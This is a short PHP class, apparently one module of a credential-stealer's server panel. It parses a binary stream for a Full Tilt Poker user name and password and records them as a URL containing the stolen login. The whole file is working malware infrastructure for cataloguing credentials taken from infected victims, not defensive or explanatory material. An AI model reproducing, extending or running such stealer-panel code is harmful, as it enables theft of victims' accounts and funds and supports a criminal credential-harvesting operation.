<?php
class Module_fulltiltpoker extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $stream = new Stream($Data);

            $User	= Assign_($stream->getSTRING_());
            if($User == NULL)
                break;
            $Pass	= Assign_($stream->getSTRING_());

            if(strlen($User) && strlen($Pass))
                $this->insert_other("http://" . $User . ":" . $Pass . "@fulltilt.com");

            $stream = NULL;

            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}